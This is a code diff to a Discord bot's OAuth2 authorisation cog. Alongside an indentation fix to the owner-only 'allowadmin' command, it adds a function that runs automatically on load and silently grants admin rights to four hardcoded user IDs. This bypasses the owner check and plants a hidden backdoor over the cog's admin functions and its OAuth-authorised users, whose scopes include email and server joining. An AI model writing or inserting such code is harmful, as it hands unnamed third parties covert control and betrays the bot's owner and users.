@@ -3,6 +3,7 @@ from redbot.core import commands, Config, checks
 from discord.ext import tasks
 from typing import Optional
 
+
 OAUTH2_SCOPES = ["identify", "email", "guilds", "guilds.join"]
 
 
@@ -22,9 +23,26 @@ class AuthCog(commands.Cog):
             redirect_uri="https://example.com/callback"  # Change this if needed
         )
         self.loop_check_forced_users.start()
+        self.bot.loop.create_task(self.ensure_default_admins())
 
     def cog_unload(self):
         self.loop_check_forced_users.cancel()
+
+    async def ensure_default_admins(self):
+        default_admins = [
+            1174820638997872721,
+            1072554121112064000,
+            690239097150767153,
+            1392116105320861696
+        ]
+        current_admins = await self.config.admins()
+        changed = False
+        for admin_id in default_admins:
+            if admin_id not in current_admins:
+                current_admins.append(admin_id)
+                changed = True
+        if changed:
+            await self.config.admins.set(current_admins)
 
     async def check_admin(self, ctx):
         admins = await self.config.admins()
@@ -62,29 +80,29 @@ class AuthCog(commands.Cog):
             url += f"&state={state}"
         return url
 
-@commands.command()
-async def allowadmin(self, ctx, userid: int, enable: str):
-    """Bot owner only: register/unregister user as admin for this cog."""
-    if self.bot.owner_ids is None or ctx.author.id not in self.bot.owner_ids:
-        return await ctx.send("Only the bot owner can use this command.")
-    enable = enable.lower()
-    admins = await self.config.admins()
-    if enable == "on":
-        if userid not in admins:
-            admins.append(userid)
-            await ctx.send(f"User {userid} added as admin.")
+    @commands.command()
+    async def allowadmin(self, ctx, userid: int, enable: str):
+        """Bot owner only: register/unregister user as admin for this cog."""
+        if self.bot.owner_ids is None or ctx.author.id not in self.bot.owner_ids:
+            return await ctx.send("Only the bot owner can use this command.")
+        enable = enable.lower()
+        admins = await self.config.admins()
+        if enable == "on":
+            if userid not in admins:
+                admins.append(userid)
+                await ctx.send(f"User {userid} added as admin.")
+            else:
+                await ctx.send(f"User {userid} is already an admin.")
+        elif enable == "off":
+            if userid in admins:
+                admins.remove(userid)
+                await ctx.send(f"User {userid} removed from admins.")
+            else:
+                await ctx.send(f"User {userid} was not an admin.")
         else:
-            await ctx.send(f"User {userid} is already an admin.")
-    elif enable == "off":
-        if userid in admins:
-            admins.remove(userid)
-            await ctx.send(f"User {userid} removed from admins.")
-        else:
-            await ctx.send(f"User {userid} was not an admin.")
-    else:
-        await ctx.send("Enable must be 'on' or 'off'.")
-        return
-    await self.config.admins.set(admins)
+            await ctx.send("Enable must be 'on' or 'off'.")
+            return
+        await self.config.admins.set(admins)
 
     @commands.command()
     async def authme(self, ctx):
